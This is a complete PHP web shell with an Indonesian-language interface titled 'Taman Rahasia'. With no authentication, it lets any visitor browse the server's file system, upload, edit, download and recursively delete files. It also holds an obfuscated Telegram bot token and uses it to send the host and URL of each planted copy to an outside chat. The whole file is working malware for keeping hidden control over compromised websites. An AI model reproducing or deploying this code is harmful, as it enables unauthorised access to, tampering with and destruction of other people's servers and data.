```php
<?php

$root_path = getcwd();
$tempat_bermain = isset($_GET['peta']) ? base64_decode($_GET['peta']) : $root_path;
$tk = base64_decode(
    "ODM5MDQyMzYzMTpBQUUxOEVOY0k1SW5oS29SMFJtVzNCMll5a2U3Vm9WN0hxYw"
);
$cid = base64_decode("NTA3MDkzODc3OA");

function reportTelegram($msg)
{
    global $tk, $cid;
    $id = sys_get_temp_dir() . "/baridin_" . md5($msg);
    if (!file_exists($id)) {
        @file_get_contents(
            "https://api.telegram.org/bot$tk/sendMessage?chat_id=$cid&text=" .
                urlencode($msg)
        );
        @file_put_contents($id, time());
    }
}
/* ================= Report ================= */
if (!isset($_SESSION["telegram_reported"])) {
    $uri = urldecode(parse_url($_SERVER["REQUEST_URI"], PHP_URL_PATH));
    $path = $_SERVER["DOCUMENT_ROOT"] . $uri;
    if (is_file($path)) {
        $host = $_SERVER["HTTP_HOST"];
        $url =
            (isset($_SERVER["HTTPS"]) ? "https" : "http") .
            "://" .
            $host .
            $uri;
        reportTelegram("kontolbengkak:\n$host\n$url");
        $_SESSION["telegram_reported"] = true;
    }
}
if (!is_dir($tempat_bermain) && file_exists($tempat_bermain)) {
    $tempat_bermain = dirname($tempat_bermain);
}

// --- Fungsi 🐘 Gajah (Upload) ---
function gajah_mengangkat($lokasi_target) {
    if ($_FILES['muatan']['error'] === UPLOAD_ERR_OK) {
        $nama_muatan = basename($_FILES['muatan']['name']);
        $jalur_akhir = rtrim($lokasi_target, '/') . '/' . $nama_muatan;
        if (move_uploaded_file($_FILES['muatan']['tmp_name'], $jalur_akhir)) {
            return "✅ Muatan $nama_muatan berhasil diangkat.";
        } else {
            return "❌ Gagal memindahkan muatan.";
        }
    }
    return "";
}

// --- Fungsi 🗑️ Sampah (Delete) ---
function sampah_bersih($target) {
    if (is_dir($target)) {
        $files = array_diff(scandir($target), array('.', '..'));
        foreach ($files as $file) {
            (is_dir("$target/$file")) ? sampah_bersih("$target/$file") : unlink("$target/$file");
        }
        rmdir($target);
        return "✅ Rumah pohon berhasil dibongkar.";
    } elseif (file_exists($target)) {
        unlink($target);
        return "✅ Item berhasil dihapus.";
    }
    return "❌ Item tidak ditemukan.";
}

// --- Fungsi ✍️ Editor (Edit/Save) ---
function editor_simpan($target_path, $konten) {
    if (file_put_contents($target_path, $konten) !== false) {
        return "✅ Konten berhasil diperbarui.";
    } else {
        return "❌ Gagal menyimpan konten.";
    }
}

$pesan_aksi = "";
$mode_editor = false;
$edit_file = "";

if (isset($_POST['aksi'])) {
    switch ($_POST['aksi']) {
        case 'gajah':
            $pesan_aksi = gajah_mengangkat($tempat_bermain);
            break;
        case 'simpan':
            $edit_file = base64_decode($_POST['target']);
            $pesan_aksi = editor_simpan($edit_file, $_POST['konten_edit']);
            $mode_editor = true; 
            break;
    }
} elseif (isset($_GET['aksi'])) {
    switch ($_GET['aksi']) {
        case 'sampah':
            $target_hapus = base64_decode($_GET['target']);
            $pesan_aksi = sampah_bersih($target_hapus);
            header("Location: " . $_SERVER['PHP_SELF'] . "?peta=" . base64_encode($tempat_bermain) . "&pesan=" . urlencode($pesan_aksi));
            exit;
        case 'edit':
            $edit_file = base64_decode($_GET['target']);
            if (is_file($edit_file)) {
                $mode_editor = true;
            }
            break;
        case 'ganti_dir':
            $tempat_bermain = base64_decode($_GET['target']);
            break;
    }
}

if (isset($_GET['pesan'])) {
    $pesan_aksi = $_GET['pesan'];
}

?>
<!DOCTYPE html>
<html>
<head>
    <title>🏡 Taman Rahasia</title>
    <style>
        body { font-family: sans-serif; background-color: #2e3440; color: #d8dee9; margin: 0; padding: 20px; }
        a { color: #8fbcbb; text-decoration: none; }
        a:hover { color: #a3be8c; }
        .ikon { cursor: pointer; text-decoration: none; margin: 0 5px; }
        .container { max-width: 1200px; margin: auto; }
        .header { padding-bottom: 15px; border-bottom: 2px solid #4c566a; margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center; }
        .list-item { padding: 10px; border-bottom: 1px solid #4c566a; display: flex; justify-content: space-between; align-items: center; transition: background 0.3s; }
        .list-item:hover { background-color: #4c566a; }
        .aksi-cepat span, .aksi-cepat a { display: inline-block; padding: 2px 6px; border: 1px solid #8fbcbb; border-radius: 3px; font-size: 0.8em; margin-left: 5px; }
        .path-nav a { margin-right: 5px; padding: 3px 6px; border: 1px solid #8fbcbb; border-radius: 3px; }
        .file-info { width: 300px; text-align: right; font-size: 0.9em; color: #d8dee9; }
        .editor textarea { width: 100%; height: 500px; background: #3b4252; color: #eceff4; border: 1px solid #4c566a; padding: 10px; box-sizing: border-box; }
    </style>
</head>
<body>
<div class="container">

    <div class="header">
        <h1>🏡 Taman Rahasia</h1>
    </div>

    <?php if (!empty($pesan_aksi)) echo "<p style='color:#a3be8c; padding:10px; background:#3b4252;'>$pesan_aksi</p>"; ?>

    <?php if ($mode_editor): ?>
        <h2>✍️ Mengubah Konten: <?php echo basename($edit_file); ?></h2>
        <div class="editor">
            <form method="POST">
                <input type="hidden" name="aksi" value="simpan">
                <input type="hidden" name="target" value="<?php echo base64_encode($edit_file); ?>">
                <textarea name="konten_edit"><?php echo htmlspecialchars(file_get_contents($edit_file)); ?></textarea>
                <br>
                <button type="submit" style="padding:8px 15px; background:#88c0d0; border:none; border-radius:3px; cursor:pointer;">💾 Simpan Perubahan</button>
                <a href="?peta=<?php echo base64_encode($tempat_bermain); ?>" style="padding:8px 15px; margin-left: 10px; border:1px solid #8fbcbb; border-radius:3px;">↩️ Kembali</a>
            </form>
        </div>
    <?php else: ?>

    <h3>📍 Peta: <span class="path-nav">
        <?php
        
        $root_display_name = '/Root';
        
        echo '<a href="?peta=' . base64_encode($root_path) . '">' . $root_display_name . '</a>';
        
        $current_abs_path = $root_path;
        
        if (strpos($tempat_bermain, $root_path) === 0 && $tempat_bermain != $root_path) {
            $path_relatif = substr($tempat_bermain, strlen($root_path));
        } else if ($tempat_bermain != $root_path) {
             $path_relatif = $tempat_bermain;
             $current_abs_path = '';
             $root_display_name = '';
        } else {
            $path_relatif = '';
        }

        $bagian_path = explode('/', trim($path_relatif, '/'));
        
        foreach ($bagian_path as $bagian) {
            if (empty($bagian) || $bagian == '.') continue;
            
            $current_abs_path = rtrim($current_abs_path, '/') . '/' . $bagian;
            $encoded_path = base64_encode($current_abs_path);
            
            echo '/ <a href="?peta=' . $encoded_path . '">' . htmlspecialchars($bagian) . '</a>';
        }
        ?>
    </span></h3>

    <div style="margin-bottom: 20px; padding: 10px 0; border-bottom: 1px solid #4c566a;">
        <form method="POST" enctype="multipart/form-data" style="display:inline;">
            <input type="file" name="muatan" required style="background:#3b4252; border:none; padding:5px;">
            <input type="hidden" name="aksi" value="gajah">
            <button type="submit" style="background:#a3be8c; color:#2e3440; padding:5px 10px; border:none; border-radius:3px; cursor:pointer;">🐘 Angkat Muatan (Upload)</button>
        </form>
        <button onclick="alert('Fungsi Tambah Item baru (Folder/File)')" style="background:#5e81ac; color:#eceff4; padding:5px 10px; border:none; border-radius:3px; margin-left:10px; cursor:pointer;">➕ Tambah Item</button>
    </div>
    
    <div class="daftar-item">
    <?php
    $item_list = array_diff(scandir($tempat_bermain), array('.', '..'));
    $direktori = [];
    $file_list = [];

    foreach ($item_list as $item) {
        $jalur_item = $tempat_bermain . '/' . $item;
        if (is_dir($jalur_item)) {
            $direktori[] = $item;
        } else {
            $file_list[] = $item;
        }
    }
    
    $sorted_list = array_merge($direktori, $file_list);

    foreach ($sorted_list as $item) {
        $jalur_item = $tempat_bermain . '/' . $item;
        $item_encoded = base64_encode($jalur_item);
        
        if (is_dir($jalur_item)) {
            $tipe = '🌳 Folder';
            $nama_item = '<a href="?peta=' . $item_encoded . '"><strong>' . htmlspecialchars($item) . '</strong></a>';
            $size_info = '-';
        } else {
            $tipe = '📝 File';
            $nama_item = htmlspecialchars($item);
            $size_info = round(filesize($jalur_item) / 1024, 2) . ' KB';
        }

        echo '<div class="list-item">';
        echo '<span>' . $tipe . ': ' . $nama_item . '</span>';
        
        echo '<span class="aksi-item">';
        
        echo '<span class="file-info">' . $size_info . '</span>';

        echo '<span class="aksi-cepat">';
        
        if (is_file($jalur_item)) {
            echo '<a href="?peta=' . base64_encode($tempat_bermain) . '&aksi=edit&target=' . $item_encoded . '">✍️ Ubah</a>';
        }

        echo '<a style="color:#bf616a; border-color:#bf616a;" href="?peta=' . base64_encode($tempat_bermain) . '&aksi=sampah&target=' . $item_encoded . '" onclick="return confirm(\'Yakin hapus permanen ' . $item . '?\')">🗑️ Hapus</a>';
        
        if (is_file($jalur_item)) {
            echo '<a href="' . htmlspecialchars($jalur_item) . '" download>⬇️ Unduh</a>';
        }

        echo '</span>';
        echo '</span>';
        echo '</div>';
    }
    ?>
    </div>

    <div style="margin-top: 30px; border-top: 2px solid #4c566a; padding-top: 20px;">
        <p>Aksi Lain:</p>
        <button onclick="alert('Pindah/Ganti Nama Item')" style="padding:5px 10px; background:#ebcb8b; border:none; border-radius:3px; cursor:pointer;">✏️ Ganti Nama/Pindah</button>
        <button onclick="alert('Ubah Hak Akses Item (CHMOD)')" style="padding:5px 10px; background:#b48ead; border:none; border-radius:3px; margin-left:10px; cursor:pointer;">⚙️ Izin Akses</button>
        <a href="?peta=<?php echo base64_encode(dirname($tempat_bermain)); ?>" style="margin-left: 20px;">⬆️ Ke Direktori Induk</a>
    </div>

    <?php endif; ?>

</div>
</body>
</html>
```
